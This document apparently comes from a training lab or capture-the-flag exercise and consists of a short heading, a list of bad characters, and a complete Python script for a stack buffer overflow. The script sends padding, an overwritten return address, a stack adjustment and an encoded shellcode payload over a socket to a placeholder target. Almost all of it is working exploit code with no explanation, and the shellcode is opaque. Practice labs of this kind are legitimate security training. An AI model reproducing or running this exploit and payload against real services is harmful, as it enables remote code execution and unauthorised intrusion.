# Buffer overflow 3

Badchars: `\x00\x11\x40\x5f\xb8\xee`

## Exploit code

```python
#!/usr/bin/env python3
import socket


ip = "MACHINE_IP"
port = 1337

buf_length = 1700
prefix = "OVERFLOW3 "
offset = 1274                           # EIP offset
overflow = "A" * offset
jmp_esp = "\x03\x12\x50\x62"

buffer = ""
buffer += prefix
buffer += overflow                      # Padding
buffer += jmp_esp                       # Overwriting saved return pointer
buffer += "\x83\xec\x10"                # NOP sled
buffer += ("\xfc\xbb\xe1\x8f\xcf\xa1\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
	"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x1d\x67\x4d\xa1\xdd"
	"\x78\x32\x2b\x38\x49\x72\x4f\x49\xfa\x42\x1b\x1f\xf7\x29\x49"
	"\x8b\x8c\x5c\x46\xbc\x25\xea\xb0\xf3\xb6\x47\x80\x92\x34\x9a"
	"\xd5\x74\x04\x55\x28\x75\x41\x88\xc1\x27\x1a\xc6\x74\xd7\x2f"
	"\x92\x44\x5c\x63\x32\xcd\x81\x34\x35\xfc\x14\x4e\x6c\xde\x97"
	"\x83\x04\x57\x8f\xc0\x21\x21\x24\x32\xdd\xb0\xec\x0a\x1e\x1e"
	"\xd1\xa2\xed\x5e\x16\x04\x0e\x15\x6e\x76\xb3\x2e\xb5\x04\x6f"
	"\xba\x2d\xae\xe4\x1c\x89\x4e\x28\xfa\x5a\x5c\x85\x88\x04\x41"
	"\x18\x5c\x3f\x7d\x91\x63\xef\xf7\xe1\x47\x2b\x53\xb1\xe6\x6a"
	"\x39\x14\x16\x6c\xe2\xc9\xb2\xe7\x0f\x1d\xcf\xaa\x47\xd2\xe2"
	"\x54\x98\x7c\x74\x27\xaa\x23\x2e\xaf\x86\xac\xe8\x28\xe8\x86"
	"\x4d\xa6\x17\x29\xae\xef\xd3\x7d\xfe\x87\xf2\xfd\x95\x57\xfa"
	"\x2b\x39\x07\x54\x84\xfa\xf7\x14\x74\x93\x1d\x9b\xab\x83\x1e"
	"\x71\xc4\x2e\xe5\x12\x2b\x06\x95\x62\xc3\x55\x55\x62\xaf\xd3"
	"\xb3\x0e\xdf\xb5\x6c\xa7\x46\x9c\xe6\x56\x86\x0a\x83\x59\x0c"
	"\xb9\x74\x17\xe5\xb4\x66\xc0\x05\x83\xd4\x47\x19\x39\x70\x0b"
	"\x88\xa6\x80\x42\xb1\x70\xd7\x03\x07\x89\xbd\xb9\x3e\x23\xa3"
	"\x43\xa6\x0c\x67\x98\x1b\x92\x66\x6d\x27\xb0\x78\xab\xa8\xfc"
	"\x2c\x63\xff\xaa\x9a\xc5\xa9\x1c\x74\x9c\x06\xf7\x10\x59\x65"
	"\xc8\x66\x66\xa0\xbe\x86\xd7\x1d\x87\xb9\xd8\xc9\x0f\xc2\x04"
	"\x6a\xef\x19\x8d\x8a\x12\x8b\xf8\x22\x8b\x5e\x41\x2f\x2c\xb5"
	"\x86\x56\xaf\x3f\x77\xad\xaf\x4a\x72\xe9\x77\xa7\x0e\x62\x12"
	"\xc7\xbd\x83\x37\xc7\x41\x7c\xb8")
buffer += "D" * (buf_length - (len(buffer) - len(prefix)))      # Trail padding
buffer += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("[+] Sending evil buffer of {} bytes...".format((len(buffer) - len(prefix))))
    s.send(bytes(buffer, "latin-1"))
    print("[+] Done!")
except socket.error:
    print("[-] Could not connect.")
finally:
    s.close()

```
